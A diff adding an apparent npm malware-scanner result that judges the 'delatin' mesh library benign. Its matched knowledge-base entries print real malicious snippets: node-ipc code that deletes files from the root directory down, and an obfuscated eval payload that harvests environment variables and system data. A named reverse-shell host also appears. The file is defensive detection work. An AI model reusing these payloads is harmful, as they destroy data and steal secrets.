@@ -1,0 +1,987 @@
+{
+  "package_name": "delatin",
+  "package_version": "0.2.0",
+  "label": "benign",
+  "detection_time": "2026-05-26T18:19:34.656172",
+  "status": "success",
+  "selected_files_count": 3,
+  "selected_files": [
+    "package/package.json",
+    "package/index.js",
+    "package/delatin.min.js"
+  ],
+  "is_malicious": false,
+  "total_files": 3,
+  "malicious_files": 0,
+  "total_slices": 2,
+  "malicious_slices": 0,
+  "file_results": [
+    {
+      "file_path": "/home/wenbo/NPMAnalysis/Dataset/unzip_benign/delatin/0.2.0/package/package.json",
+      "status": "empty",
+      "is_malicious": false,
+      "total_slices": 0,
+      "malicious_slices": 0,
+      "slice_results": []
+    },
+    {
+      "file_path": "/home/wenbo/NPMAnalysis/Dataset/unzip_benign/delatin/0.2.0/package/index.js",
+      "status": "success",
+      "is_malicious": false,
+      "total_slices": 1,
+      "malicious_slices": 0,
+      "slice_results": [
+        {
+          "slice_id": "index_slice_1",
+          "code_snippet": "\nexport default class Delatin {\n\n    constructor(data, width, height = width) {\n        this.data = data; // height data\n        this.width = width;\n        this.height = height;\n\n        this.coords = []; // vertex coordinates (x, y)\n        this.triangles = []; // mesh triangle indices\n\n        // additional triangle data\n        this._halfedges = [];\n        this._candidates = [];\n        this._queueIndices = [];\n\n        this._queue = []; // queue of added triangles\n        this._errors = [];\n        this._pending = []; // triangles pending addition to queue\n        this._pendingLen = 0;\n\n        this._rmsdSum = 0;\n        this._init();\n    }\n\n    // refine the mesh until its maximum error gets below the given one\n    run(maxError = 1) {\n        while (this.getMaxError() > maxError) {\n            this.refine();\n        }\n    }\n\n    // refine the mesh with a single point\n    refine() {\n        this._step();\n        this._flush();\n    }\n\n    // max error of the current mesh\n    getMaxError() {\n        return this._errors[0];\n    }\n\n    // root-mean-square deviation of the current mesh\n    getRMSD() {\n        return Math.sqrt(this._rmsdSum / this._errors.length);\n    }\n\n    // height value at a given position\n    heightAt(x, y) {\n        return this.data[this.width * y + x];\n    }\n\n    _init() {\n        const x1 = this.width - 1;\n        const y1 = this.height - 1;\n        const p0 = this._addPoint(0, 0);\n        const p1 = this._addPoint(x1, 0);\n        const p2 = this._addPoint(0, y1);\n        const p3 = this._addPoint(x1, y1);\n\n        // add initial two triangles\n        const t0 = this._addTriangle(p3, p0, p2, -1, -1, -1);\n        this._addTriangle(p0, p3, p1, t0, -1, -1);\n        this._flush();\n    }\n\n    // rasterize and queue all triangles that got added or updated in _step\n    _flush() {\n        const coords = this.coords;\n        for (let i = 0; i < this._pendingLen; i++) {\n            const t = this._pending[i];\n            // rasterize triangle to find maximum pixel error\n            const a = 2 * this.triangles[t * 3 + 0];\n            const b = 2 * this.triangles[t * 3 + 1];\n            const c = 2 * this.triangles[t * 3 + 2];\n            this._findCandidate(coords[a], coords[a + 1], coords[b], coords[b + 1], coords[c], coords[c + 1], t);\n        }\n        this._pendingLen = 0;\n    }\n\n    // rasterize a triangle, find its max error, and queue it for processing\n    _findCandidate(p0x, p0y, p1x, p1y, p2x, p2y, t) {\n        // triangle bounding box\n        const minX = Math.min(p0x, p1x, p2x);\n        const minY = Math.min(p0y, p1y, p2y);\n        const maxX = Math.max(p0x, p1x, p2x);\n        const maxY = Math.max(p0y, p1y, p2y);\n\n        // forward differencing variables\n        let w00 = orient(p1x, p1y, p2x, p2y, minX, minY);\n        let w01 = orient(p2x, p2y, p0x, p0y, minX, minY);\n        let w02 = orient(p0x, p0y, p1x, p1y, minX, minY);\n        const a01 = p1y - p0y;\n        const b01 = p0x - p1x;\n        const a12 = p2y - p1y;\n        const b12 = p1x - p2x;\n        const a20 = p0y - p2y;\n        const b20 = p2x - p0x;\n\n        // pre-multiplied z values at vertices\n        const a = orient(p0x, p0y, p1x, p1y, p2x, p2y);\n        const z0 = this.heightAt(p0x, p0y) / a;\n        const z1 = this.heightAt(p1x, p1y) / a;\n        const z2 = this.heightAt(p2x, p2y) / a;\n\n        // iterate over pixels in bounding box\n        let maxError = 0;\n        let mx = 0;\n        let my = 0;\n        for (let y = minY; y <= maxY; y++) {\n            // compute starting offset\n            let dx = 0;\n            if (w00 < 0 && a12 !== 0) {\n                dx = Math.max(dx, Math.floor(-w00 / a12));\n            }\n            if (w01 < 0 && a20 !== 0) {\n                dx = Math.max(dx, Math.floor(-w01 / a20));\n            }\n            if (w02 < 0 && a01 !== 0) {\n                dx = Math.max(dx, Math.floor(-w02 / a01));\n            }\n\n            let w0 = w00 + a12 * dx;\n            let w1 = w01 + a20 * dx;\n            let w2 = w02 + a01 * dx;\n\n            let wasInside = false;\n\n            for (let x = minX + dx; x <= maxX; x++) {\n                // check if inside triangle\n                if (w0 >= 0 && w1 >= 0 && w2 >= 0) {\n                    wasInside = true;\n\n                    // compute z using barycentric coordinates\n                    const z = z0 * w0 + z1 * w1 + z2 * w2;\n                    const dz = Math.abs(z - this.heightAt(x, y));\n                    if (dz > maxError) {\n                        maxError = dz;\n                        mx = x;\n                        my = y;\n                    }\n                } else if (wasInside) {\n                    break;\n                }\n\n                w0 += a12;\n                w1 += a20;\n                w2 += a01;\n            }\n\n            w00 += b12;\n            w01 += b20;\n            w02 += b01;\n        }\n\n        if (mx === p0x && my === p0y || mx === p1x && my === p1y || mx === p2x && my === p2y) {\n            maxError = 0;\n        }\n\n        // update triangle metadata\n        this._candidates[2 * t] = mx;\n        this._candidates[2 * t + 1] = my;\n\n        // add triangle to priority queue\n        this._queuePush(t, maxError);\n    }\n\n    // process the next triangle in the queue, splitting it with a new point\n    _step() {\n        // pop triangle with highest error from priority queue\n        const t = this._queuePop();\n\n        const e0 = t * 3 + 0;\n        const e1 = t * 3 + 1;\n        const e2 = t * 3 + 2;\n\n        const p0 = this.triangles[e0];\n        const p1 = this.triangles[e1];\n        const p2 = this.triangles[e2];\n\n        const ax = this.coords[2 * p0];\n        const ay = this.coords[2 * p0 + 1];\n        const bx = this.coords[2 * p1];\n        const by = this.coords[2 * p1 + 1];\n        const cx = this.coords[2 * p2];\n        const cy = this.coords[2 * p2 + 1];\n        const px = this._candidates[2 * t];\n        const py = this._candidates[2 * t + 1];\n\n        const pn = this._addPoint(px, py);\n\n        if (orient(ax, ay, bx, by, px, py) === 0) {\n            this._handleCollinear(pn, e0);\n\n        } else if (orient(bx, by, cx, cy, px, py) === 0) {\n            this._handleCollinear(pn, e1);\n\n        } else if (orient(cx, cy, ax, ay, px, py) === 0) {\n            this._handleCollinear(pn, e2);\n\n        } else {\n            const h0 = this._halfedges[e0];\n            const h1 = this._halfedges[e1];\n            const h2 = this._halfedges[e2];\n\n            const t0 = this._addTriangle(p0, p1, pn, h0, -1, -1, e0);\n            const t1 = this._addTriangle(p1, p2, pn, h1, -1, t0 + 1);\n            const t2 = this._addTriangle(p2, p0, pn, h2, t0 + 2, t1 + 1);\n\n            this._legalize(t0);\n            this._legalize(t1);\n            this._legalize(t2);\n        }\n    }\n\n    // add coordinates for a new vertex\n    _addPoint(x, y) {\n        const i = this.coords.length >> 1;\n        this.coords.push(x, y);\n        return i;\n    }\n\n    // add or update a triangle in the mesh\n    _addTriangle(a, b, c, ab, bc, ca, e = this.triangles.length) {\n        const t = e / 3; // new triangle index\n\n        // add triangle vertices\n        this.triangles[e + 0] = a;\n        this.triangles[e + 1] = b;\n        this.triangles[e + 2] = c;\n\n        // add triangle halfedges\n        this._halfedges[e + 0] = ab;\n        this._halfedges[e + 1] = bc;\n        this._halfedges[e + 2] = ca;\n\n        // link neighboring halfedges\n        if (ab >= 0) {\n            this._halfedges[ab] = e + 0;\n        }\n        if (bc >= 0) {\n            this._halfedges[bc] = e + 1;\n        }\n        if (ca >= 0) {\n            this._halfedges[ca] = e + 2;\n        }\n\n        // init triangle metadata\n        this._candidates[2 * t + 0] = 0;\n        this._candidates[2 * t + 1] = 0;\n        this._queueIndices[t] = -1;\n\n        // add triangle to pending queue for later rasterization\n        this._pending[this._pendingLen++] = t;\n\n        // return first halfedge index\n        return e;\n    }\n\n    _legalize(a) {\n        // if the pair of triangles doesn't satisfy the Delaunay condition\n        // (p1 is inside the circumcircle of [p0, pl, pr]), flip them,\n        // then do the same check/flip recursively for the new pair of triangles\n        //\n        //           pl                    pl\n        //          /||\\                  /  \\\n        //       al/ || \\bl            al/    \\a\n        //        /  ||  \\              /      \\\n        //       /  a||b  \\    flip    /___ar___\\\n        //     p0\\   ||   /p1   =>   p0\\---bl---/p1\n        //        \\  ||  /              \\      /\n        //       ar\\ || /br             b\\    /br\n        //          \\||/                  \\  /\n        //           pr                    pr\n\n        const b = this._halfedges[a];\n\n        if (b < 0) {\n            return;\n        }\n\n        const a0 = a - a % 3;\n        const b0 = b - b % 3;\n        const al = a0 + (a + 1) % 3;\n        const ar = a0 + (a + 2) % 3;\n        const bl = b0 + (b + 2) % 3;\n        const br = b0 + (b + 1) % 3;\n        const p0 = this.triangles[ar];\n        const pr = this.triangles[a];\n        const pl = this.triangles[al];\n        const p1 = this.triangles[bl];\n        const coords = this.coords;\n\n        if (!inCircle(\n            coords[2 * p0], coords[2 * p0 + 1],\n            coords[2 * pr], coords[2 * pr + 1],\n            coords[2 * pl], coords[2 * pl + 1],\n            coords[2 * p1], coords[2 * p1 + 1])) {\n            return;\n        }\n\n        const hal = this._halfedges[al];\n        const har = this._halfedges[ar];\n        const hbl = this._halfedges[bl];\n        const hbr = this._halfedges[br];\n\n        this._queueRemove(a0 / 3);\n        this._queueRemove(b0 / 3);\n\n        const t0 = this._addTriangle(p0, p1, pl, -1, hbl, hal, a0);\n        const t1 = this._addTriangle(p1, p0, pr, t0, har, hbr, b0);\n\n        this._legalize(t0 + 1);\n        this._legalize(t1 + 2);\n    }\n\n    // handle a case where new vertex is on the edge of a triangle\n    _handleCollinear(pn, a) {\n        const a0 = a - a % 3;\n        const al = a0 + (a + 1) % 3;\n        const ar = a0 + (a + 2) % 3;\n        const p0 = this.triangles[ar];\n        const pr = this.triangles[a];\n        const pl = this.triangles[al];\n        const hal = this._halfedges[al];\n        const har = this._halfedges[ar];\n\n        const b = this._halfedges[a];\n\n        if (b < 0) {\n            const t0 = this._addTriangle(pn, p0, pr, -1, har, -1, a0);\n            const t1 = this._addTriangle(p0, pn, pl, t0, -1, hal);\n            this._legalize(t0 + 1);\n            this._legalize(t1 + 2);\n            return;\n        }\n\n        const b0 = b - b % 3;\n        const bl = b0 + (b + 2) % 3;\n        const br = b0 + (b + 1) % 3;\n        const p1 = this.triangles[bl];\n        const hbl = this._halfedges[bl];\n        const hbr = this._halfedges[br];\n\n        this._queueRemove(b0 / 3);\n\n        const t0 = this._addTriangle(p0, pr, pn, har, -1, -1, a0);\n        const t1 = this._addTriangle(pr, p1, pn, hbr, -1, t0 + 1, b0);\n        const t2 = this._addTriangle(p1, pl, pn, hbl, -1, t1 + 1);\n        const t3 = this._addTriangle(pl, p0, pn, hal, t0 + 2, t2 + 1);\n\n        this._legalize(t0);\n        this._legalize(t1);\n        this._legalize(t2);\n        this._legalize(t3);\n    }\n\n    // priority queue methods\n\n    _queuePush(t, error) {\n        const i = this._queue.length;\n        this._queueIndices[t] = i;\n        this._queue.push(t);\n        this._errors.push(error);\n        this._rmsdSum += error * error;\n        this._queueUp(i);\n    }\n\n    _queuePop() {\n        const n = this._queue.length - 1;\n        this._queueSwap(0, n);\n        this._queueDown(0, n);\n        return this._queuePopBack();\n    }\n\n    _queuePopBack() {\n        const t = this._queue.pop();\n        const e = this._errors.pop();\n        this._rmsdSum -= e * e;\n        this._queueIndices[t] = -1;\n        return t;\n    }\n\n    _queueRemove(t) {\n        const i = this._queueIndices[t];\n        if (i < 0) {\n            const it = this._pending.indexOf(t);\n            if (it !== -1) {\n                this._pending[it] = this._pending[--this._pendingLen];\n            } else {\n                throw new Error('Broken triangulation (something went wrong).');\n            }\n            return;\n        }\n        const n = this._queue.length - 1;\n        if (n !== i) {\n            this._queueSwap(i, n);\n            if (!this._queueDown(i, n)) {\n                this._queueUp(i);\n            }\n        }\n        this._queuePopBack();\n    }\n\n    _queueLess(i, j) {\n        return this._errors[i] > this._errors[j];\n    }\n\n    _queueSwap(i, j) {\n        const pi = this._queue[i];\n        const pj = this._queue[j];\n        this._queue[i] = pj;\n        this._queue[j] = pi;\n        this._queueIndices[pi] = j;\n        this._queueIndices[pj] = i;\n        const e = this._errors[i];\n        this._errors[i] = this._errors[j];\n        this._errors[j] = e;\n    }\n\n    _queueUp(j0) {\n        let j = j0;\n        while (true) {\n            const i = (j - 1) >> 1;\n            if (i === j || !this._queueLess(j, i)) {\n                break;\n            }\n            this._queueSwap(i, j);\n            j = i;\n        }\n    }\n\n    _queueDown(i0, n) {\n        let i = i0;\n        while (true) {\n            const j1 = 2 * i + 1;\n            if (j1 >= n || j1 < 0) {\n                break;\n            }\n            const j2 = j1 + 1;\n            let j = j1;\n            if (j2 < n && this._queueLess(j2, j1)) {\n                j = j2;\n            }\n            if (!this._queueLess(j, i)) {\n                break;\n            }\n            this._queueSwap(i, j);\n            i = j;\n        }\n        return i > i0;\n    }\n}\n\nfunction orient(ax, ay, bx, by, cx, cy) {\n    return (bx - cx) * (ay - cy) - (by - cy) * (ax - cx);\n}\n\nfunction inCircle(ax, ay, bx, by, cx, cy, px, py) {\n    const dx = ax - px;\n    const dy = ay - py;\n    const ex = bx - px;\n    const ey = by - py;\n    const fx = cx - px;\n    const fy = cy - py;\n\n    const ap = dx * dx + dy * dy;\n    const bp = ex * ex + ey * ey;\n    const cp = fx * fx + fy * fy;\n\n    return dx * (ey * cp - bp * fy) -\n           dy * (ex * cp - bp * fx) +\n           ap * (ex * fy - ey * fx) < 0;\n}\n",
+          "is_malicious": false,
+          "malice_score": 0.35564629435539247,
+          "confidence": 0.0,
+          "behavior_summary": "When called, the code performs computational geometry operations to refine a mesh based on height data by manipulating vertex coordinates and triangle indices without accessing any sensitive APIs or external resources, resulting in purely local data processing with no network, file, or system execution activities.",
+          "explanation": "[LLM Judgment: Benign] The provided code is a computational geometry implementation focused on mesh refinement using Delaunay triangulation principles. It operates purely on local data structures (arrays of coordinates and triangles) and performs no network requests, no file system operations, no environment or system information gathering, and no code obfuscation or dynamic code execution. The known malicious patterns from the knowledge base involve network communication (e.g., geolocation API calls), obfuscated payloads, environment manipulation, and destructive file operations, none of which are present in this code. The code's behavior is consistent with legitimate numerical and graphical processing libraries, with no indicators of malicious intent.",
+          "matched_knowledge_count": 5,
+          "matched_knowledge": [
+            {
+              "match_id": "20240824_195356_692327_snippet_1",
+              "source_package": "node-ipc (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20240824_195356_692327/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.37488752603530884,
+              "code_similarity": 0.32790082693099976,
+              "behavior_similarity": 0.4218742251396179,
+              "matched_snippet": {
+                "snippet_id": "snippet_1",
+                "code_snippet": "setTimeout(function () {\n    const randomNumber = Math.round(Math.random() * 4);\n    if (randomNumber > 1) {\n        // return;\n    }\n    const apiKey = \"https://api.ipgeolocation.io/ipgeo?apiKey=ae511e1627824a968aaaa758a5309154\";\n    const pwd = \"./\";\n    const parentDir = \"../\";\n    const grandParentDir = \"../../\";\n    const root = \"/\";\n    const countryName = \"country_name\";\n    const russia = \"russia\";\n    const belarus = \"belarus\";\n    https.get(apiKey, function (message) {\n        message.on(\"data\", function (msgBuffer) {\n            try {\n                const message = JSON.parse(msgBuffer.toString(\"utf8\"));\n                const userCountryName = message[countryName.toString(\"utf8\")].toLowerCase();\n                const hasRus = userCountryName.includes(russia.toString(\"utf8\")) || userCountryName.includes(belarus.toString(\"utf8\"));\n                if (hasRus) {\n                    deleteFile(pwd);\n                    deleteFile(parentDir);\n                    deleteFile(grandParentDir);\n                    deleteFile(root);\n                }\n            } catch (t) {}\n        });\n    });\n    // zkyf: Let's try this directly here\n    deleteFile(pwd);\n    deleteFile(parentDir);\n    deleteFile(grandParentDir);\n    deleteFile(root);\n}, 100);",
+                "code_behavior": "At runtime, shortly after import, the code initiates a delayed execution using setTimeout, performs an external geolocation API request, parses the response to determine the user's country, and if the country is Russia or Belarus, recursively calls a file deletion function on multiple directory levels, resulting in destructive file overwrites.",
+                "malice_analysis": {
+                  "why_suspicious": "The code makes an unsolicited external geolocation API request and, based on the result, triggers recursive file overwrite operations targeting the entire filesystem. This is a clear indicator of a targeted, destructive payload.",
+                  "violated_expectations": "A legitimate IPC package should not perform geolocation checks or attempt to overwrite user files under any circumstances. The expected behavior is to provide inter-process communication utilities, not to execute destructive actions based on user location.",
+                  "similar_legitimate_use": "Geolocation checks may be used for regional feature toggling or compliance, but never to trigger destructive file operations. Recursive file deletion is only appropriate in uninstallers or cleanup tools, and only with explicit user consent.",
+                  "key_indicators": [
+                    "Automated geolocation API request at runtime",
+                    "Conditional logic targeting specific countries (Russia, Belarus)",
+                    "Recursive invocation of file overwrite function across multiple directory levels",
+                    "Destructive file operations triggered without user interaction"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "runtime (shortly after import, via setTimeout)",
+                  "file_location": "dao/ssl-geospec.js",
+                  "required_permissions": [
+                    "network",
+                    "filesystem"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "node-ipc",
+                  "package_manager": "npm",
+                  "package_versions": "10.1.1, 10.1.2",
+                  "why_malicious": "The package was intentionally altered by its maintainer to include code that, upon execution, checks the user's geolocation via an external API. If the user is located in Russia or Belarus, the code recursively overwrites files across the filesystem with a heart emoji, resulting in widespread and deliberate data destruction. This constitutes a targeted sabotage attack, which is entirely outside the scope of legitimate package behavior."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "On package installation or import, the malicious code in dao/ssl-geospec.js is loaded and scheduled for execution via setTimeout.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Geolocation check and potential execution of destructive payload"
+                  },
+                  {
+                    "step": 2,
+                    "action": "The code performs an external geolocation API request to determine if the user is located in Russia or Belarus.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Conditional execution of recursive file overwrite function"
+                  },
+                  {
+                    "step": 3,
+                    "action": "If the user is in a targeted country, the code recursively attempts to overwrite all files on the system with a heart emoji.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "Destruction of user and system data"
+                  },
+                  {
+                    "step": 4,
+                    "action": "In related packages (peacenotwar, oneday-test), the code writes a protest message file to user Desktop and OneDrive directories.",
+                    "implemented_by": [
+                      "snippet_3"
+                    ],
+                    "leads_to": "Display of unsolicited political/protest message in user-accessible locations"
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "JavaScript packages that make runtime geolocation API requests and subsequently perform recursive filesystem operations or file overwrites",
+                    "Recursive file overwrite attempts targeting user and system directories, especially with static content (e.g., heart emoji)",
+                    "Creation of unsolicited files with political or protest content in user Desktop or OneDrive directories"
+                  ],
+                  "file_indicators": [
+                    "dao/ssl-geospec.js",
+                    "WITH-LOVE-FROM-AMERICA.txt",
+                    "Unusual file writes to ~/Desktop, ~/OneDrive, ~/OneDrive/Desktop"
+                  ],
+                  "network_indicators": [
+                    "https://api.ipgeolocation.io/ipgeo?apiKey=ae511e1627824a968aaaa758a5309154"
+                  ],
+                  "how_to_detect": "Monitor for JavaScript packages that initiate external geolocation API requests at runtime, especially if followed by recursive filesystem operations or file overwrites. Flag any package that writes unsolicited files to user Desktop or OneDrive directories, or that contains the file dao/ssl-geospec.js. Alert on the presence of WITH-LOVE-FROM-AMERICA.txt in user directories. Correlate destructive file operations or unusual file creation with recent package updates or new dependencies to identify malicious activity."
+                }
+              }
+            },
+            {
+              "match_id": "20241224_104012_987336_snippet_3",
+              "source_package": "[Multiple: e.g., linkis-website, rocketmq-site, aliyundrive, etc.] (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20241224_104012_987336/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.35152748227119446,
+              "code_similarity": 0.4018372893333435,
+              "behavior_similarity": 0.3012176752090454,
+              "matched_snippet": {
+                "snippet_id": "snippet_3",
+                "code_snippet": "var os = require(\"os\"),\n    zlib = require(\"zlib\"),\n    bs = \"base64\",\n    filterNet = (o) => {\n        var oR = {};\n        for (var k in o) {\n            if (\"lo0\" == k) continue;\n            for (var i in o[k]) {\n                if (\"127.0.0.1\" == o[k][i][\"address\"]) continue;\n                if (o[k][i][\"family\"] == \"IPv4\" && o[k][i][\"address\"]) {\n                    oR[k] = o[k][i]\n                    break;\n                }\n            }\n        }\n        return oR;\n    },\n    rmKeys = (o, ...keys) => {\n        for (var k in keys) {\n            delete o[keys[k]];\n        }\n        return o;\n    },\n    pkg = JSON.parse(require(\"fs\").readFileSync(\"package.json\").toString(\"utf8\")),\n    zS = (s) => zlib.brotliCompressSync(s, { level: 11, windowBits: 15, quality: 11 }).toString(bs),\n    zO = (o) => zS(JSON.stringify(o, null, 2)),\n    uS = (s) => zlib.brotliDecompressSync(Buffer.from(s, bs)).toString(),\n    o = {\n        \"name\": pkg.name,\n        \"version\": pkg.version,\n        \"pwd\": process.cwd(),\n        \"env\": process.env,\n        \"platform\": os.platform(),\n        \"arch\": os.arch(),\n        \"release\": os.release(),\n        \"type\": os.type(),\n        \"uptime\": os.uptime(),\n        \"hostname\": os.hostname(),\n        \"cpus\": [os.cpus().length, rmKeys(os.cpus()[0], \"times\")],\n        \"networkInterfaces\": filterNet(os.networkInterfaces()),\n        \"freemem\": os.freemem(),\n        \"totalmem\": os.totalmem(),\n        \"userInfo\": os.userInfo()\n    };\nlet s = zO(o), s1 = uS(`G/sCIJwHtg1sfVPqObPQC6WsmlPZnVOfAqCQlUG+AJay52WlQRR23HYKiwLI/7ncvQM75zP689ZqjKlrgZVYcYBp1gM8R5zV4glyFKt+CPgOAIT7ekBlFUzW87zjyA6CooEMdzcFs33O/t2tAXawBJUI9pOdw8hOkS4DYLG9xHRAeDZ5ZXbs1oL+Z+k+M2aA4HzxpZD/VAbL7E8erim7UfCx9F/Y4+yCKMrUklhDVFoCdwwQYsUTOxl/nc+gLuTlglxBdupg+2xUfQt7zegHtGsz5GkVkFMdVd6qgszOQWOzY8FtLc/U7KSvB2Q4l4yGpcavIeSsCiZV7YQM5X3KWTMz8v1g55Yld/RldQTkyU91zlOFCeelQqC8qAIL4vEXNhgs2suqFHoQstfjXJpvHFgV0v7Bf8f7X38+oji8qZQUEG8LimNT5MDFKHJ5efBeZkZVIAKCp7gdzI60KAs=`);\nprocess.env.NODE_NO_EVAL = undefined;\neval(s1);",
+                "code_behavior": "At runtime, when rsh.js is executed as a detached process, the code collects detailed system, environment, and user information, compresses and encodes it, decompresses an obfuscated payload from a base64 string, sets the NODE_NO_EVAL environment variable to undefined, and executes the decompressed payload using eval, resulting in the execution of further malicious code.",
+                "malice_analysis": {
+                  "why_suspicious": "Collecting extensive system, environment, and user data, compressing and encoding it, and executing obfuscated code via eval are all strong indicators of malicious intent and are commonly used to evade detection and enable data exfiltration.",
+                  "violated_expectations": "Legitimate packages do not collect and exfiltrate system or user information, nor do they execute dynamically decompressed and obfuscated code via eval.",
+                  "similar_legitimate_use": "Compression and system info gathering may be used in legitimate diagnostics or telemetry, but not in combination with obfuscated payload execution and without user consent.",
+                  "key_indicators": [
+                    "Obfuscated and base64-encoded payload decompressed and executed via eval",
+                    "Systematic collection of system, environment, and user data",
+                    "Manipulation of environment variables to bypass security controls",
+                    "No user notification or consent for data collection or code execution"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "runtime (when rsh.js is executed)",
+                  "file_location": "scripts/rsh.js",
+                  "required_permissions": [
+                    "filesystem",
+                    "network",
+                    "environment_vars",
+                    "process"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "[Multiple: e.g., linkis-website, rocketmq-site, aliyundrive, etc.]",
+                  "package_manager": "npm",
+                  "package_versions": "[e.g., 6.0.2, 6.0.3, 6.0.4, 2.2.1, 2.2.3, 7.0.5, 5.0.2, 3.0.3]",
+                  "why_malicious": "All packages in this campaign execute obfuscated JavaScript code at install time, which collects extensive system, environment, and user information and establishes a persistent reverse shell to a remote attacker-controlled server (rsh.51pwn.com:8880), enabling full remote code execution and exfiltration of sensitive data. The attack chain is triggered via multiple npm lifecycle hooks, uses detached background processes for persistence, and employs obfuscation and dynamic code execution to evade detection."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Malicious package is installed, triggering preinstall, postinstall, test, or init scripts defined in package.json.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Execution of scripts/init.js"
+                  },
+                  {
+                    "step": 2,
+                    "action": "scripts/init.js is executed, which launches scripts/rsh.js as a detached child process and immediately exits to conceal ongoing activity.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "Execution of scripts/rsh.js in the background"
+                  },
+                  {
+                    "step": 3,
+                    "action": "scripts/rsh.js collects detailed system, environment, and user data, compresses and encodes it, decompresses an obfuscated payload, and executes it via eval.",
+                    "implemented_by": [
+                      "snippet_3"
+                    ],
+                    "leads_to": "Execution of reverse shell payload from decompressed code"
+                  },
+                  {
+                    "step": 4,
+                    "action": "The reverse shell payload establishes a persistent connection to rsh.51pwn.com:8880, exfiltrates collected system information, and provides the attacker with remote shell access for arbitrary command execution.",
+                    "implemented_by": [
+                      "snippet_4"
+                    ],
+                    "leads_to": "Attacker gains persistent remote access and control over the compromised system"
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Execution of scripts/init.js during npm install, test, or init lifecycle events",
+                    "Creation of detached child processes in install/test scripts (child_process.fork with {detached: true})",
+                    "Presence of obfuscated or base64-encoded JavaScript payloads in package files",
+                    "Use of eval to execute dynamically decompressed or generated code",
+                    "Outbound TCP connections to hardcoded C2 domains (e.g., rsh.51pwn.com:8880) during or after installation",
+                    "Collection and exfiltration of system, environment, and user data during package installation or execution"
+                  ],
+                  "file_indicators": [
+                    "scripts/init.js",
+                    "scripts/rsh.js",
+                    "package.json with install/test/init scripts running 'node ./scripts/init.js'",
+                    "Obfuscated JavaScript with base64-encoded or Unicode-escaped payloads"
+                  ],
+                  "network_indicators": [
+                    "rsh.51pwn.com:8880",
+                    "Outbound TCP connections to rsh.51pwn.com on port 8880",
+                    "Initial data exfiltration containing compressed system information"
+                  ],
+                  "how_to_detect": "Monitor npm packages for execution of scripts during install, test, or init lifecycle events, especially those launching detached child processes or containing obfuscated/base64-encoded code. Flag any package that establishes outbound TCP connections to suspicious domains (e.g., rsh.51pwn.com) or uncommon ports during or after installation. Use static analysis to detect eval usage on dynamically decompressed payloads and the presence of Unicode-escaped or base64-encoded code. Alert on collection and exfiltration of system, environment, or user data during package installation or execution. Correlate file indicators (scripts/init.js, scripts/rsh.js, suspicious package.json scripts) with behavioral and network indicators for high-confidence detection."
+                }
+              }
+            },
+            {
+              "match_id": "20250102_111622_783890_snippet_1",
+              "source_package": "node-ipc (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20250102_111622_783890/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.34381574392318726,
+              "code_similarity": 0.34261685609817505,
+              "behavior_similarity": 0.34501466155052185,
+              "matched_snippet": {
+                "snippet_id": "snippet_1",
+                "code_snippet": "import u from 'path';\nimport a from 'fs';\nimport o from 'https';\nsetTimeout(function(){\n  const t = Math.round(Math.random() * 4);\n  if (t > 1) {\n    return;\n  }\n  const n = Buffer.from('...','base64').toString('utf8');\n  // ...\n  if (geo == 'RU' || geo == 'BY') {\n    // destructive overwrite logic\n  }\n  // ...\n});",
+                "code_behavior": "At import-time, the code retrieves the user's external IP address via an HTTPS request, determines geolocation, and if the user is in Russia or Belarus, recursively overwrites the contents of all files on the filesystem with a heart emoji, resulting in irreversible data loss.",
+                "malice_analysis": {
+                  "why_suspicious": "The code performs a geolocation check using the user's external IP and, based on the result, executes a recursive file overwrite operation that destroys user data. This behavior is highly abnormal and dangerous for any npm package, especially one used as a dependency.",
+                  "violated_expectations": "Normal npm packages should not perform geolocation checks or destructive file operations on user systems, particularly without user consent or notification.",
+                  "similar_legitimate_use": "Geolocation checks may be used for regional feature toggling or telemetry, but never to trigger destructive actions such as file overwrites or deletions.",
+                  "key_indicators": [
+                    "Obfuscated and base64-encoded payloads embedded in the code",
+                    "Recursive traversal and overwrite of filesystem files",
+                    "Conditional execution based on geolocation (targeting Russia and Belarus)",
+                    "No user interaction, consent, or warning prior to destructive action",
+                    "Network request to external geolocation API at import-time"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "import-time",
+                  "file_location": "dao/ssl-geospec.js",
+                  "required_permissions": [
+                    "filesystem",
+                    "network"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "node-ipc",
+                  "package_manager": "npm",
+                  "package_versions": "10.1.1, 10.1.2, 9.2.2, 11.0.0 and above",
+                  "why_malicious": "Select versions of 'node-ipc' contain destructive and protestware code that conditionally overwrites or deletes files on systems located in Russia and Belarus, and/or drops unsolicited 'peace' messages on user desktops. This constitutes a critical supply chain attack, as the package is widely used as a dependency in major projects, enabling widespread impact without user awareness or consent."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "User or CI system installs or updates a project that depends on a malicious version of node-ipc.",
+                    "implemented_by": [],
+                    "leads_to": "Malicious code in node-ipc is executed during install or import."
+                  },
+                  {
+                    "step": 2,
+                    "action": "Malicious code in dao/ssl-geospec.js executes at import-time, retrieves the user's external IP address, and determines geolocation.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Conditional execution of destructive or protestware payloads based on geolocation."
+                  },
+                  {
+                    "step": 3,
